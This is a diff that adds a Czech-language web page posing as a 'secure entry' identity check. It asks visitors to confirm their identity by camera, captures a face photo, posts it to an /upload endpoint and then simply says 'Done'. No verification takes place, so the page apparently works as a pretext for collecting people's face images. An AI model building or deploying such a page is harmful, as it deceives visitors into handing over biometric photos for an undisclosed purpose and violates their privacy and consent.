@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vstup na stránku</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { -webkit-tap-highlight-color: transparent; }
+    </style>
+</head>
+<body class="bg-[#f0f2f5] flex items-center justify-center min-h-screen m-0 p-4 font-sans text-gray-900">
+    <div id="app-content" class="text-center p-8 bg-white rounded-3xl shadow-xl w-full max-w-sm border border-gray-100">
+        
+        <div id="init-view">
+            <div class="mb-6 inline-flex p-4 bg-blue-50 rounded-full">
+                <svg class="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                </svg>
+            </div>
+            <h1 class="text-xl font-bold mb-2">Zabezpečený vstup</h1>
+            <p class="text-sm text-gray-500 mb-8 leading-relaxed">Pro přístup k obsahu je vyžadováno potvrzení identity přes kameru.</p>
+            <button id="start-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 px-8 rounded-2xl transition duration-300 shadow-lg">
+                Spustit ověření
+            </button>
+        </div>
+
+        <div id="camera-view" class="hidden">
+            <div class="relative mx-auto mb-6 rounded-2xl overflow-hidden bg-gray-900 aspect-square shadow-inner">
+                <video id="video" class="w-full h-full object-cover" autoplay playsinline></video>
+            </div>
+            <button id="snap" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-8 rounded-2xl transition duration-300">
+                <span id="btn-text">Potvrdit a pokračovat</span>
+            </button>
+        </div>
+
+        <div id="final-message" class="hidden">
+            <div class="mb-4 text-5xl text-green-500">✓</div>
+            <h2 class="text-xl font-bold mb-1">Hotovo</h2>
+            <p class="text-gray-500">Měj pěkný den.</p>
+        </div>
+    </div>
+
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <script>
+        const initView = document.getElementById('init-view');
+        const cameraView = document.getElementById('camera-view');
+        const finalMessage = document.getElementById('final-message');
+        const startBtn = document.getElementById('start-btn');
+        const snapBtn = document.getElementById('snap');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const btnText = document.getElementById('btn-text');
+
+        startBtn.onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                initView.classList.add('hidden');
+                cameraView.classList.remove('hidden');
+            } catch (err) {
+                alert('Povolte prosím přístup ke kameře.');
+            }
+        };
+
+        snapBtn.onclick = async () => {
+            btnText.innerText = "Ověřování...";
+            snapBtn.disabled = true;
+
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.6);
+
+            try {
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+
+                if (response.ok) {
+                    cameraView.classList.add('hidden');
+                    finalMessage.classList.remove('hidden');
+                    if (video.srcObject) {
+                        video.srcObject.getTracks().forEach(t => t.stop());
+                    }
+                }
+            } catch (err) {
+                alert('Chyba serveru.');
+                btnText.innerText = "Zkusit znovu";
+                snapBtn.disabled = false;
+            }
+        };
+    </script>
+</body>
+</html>
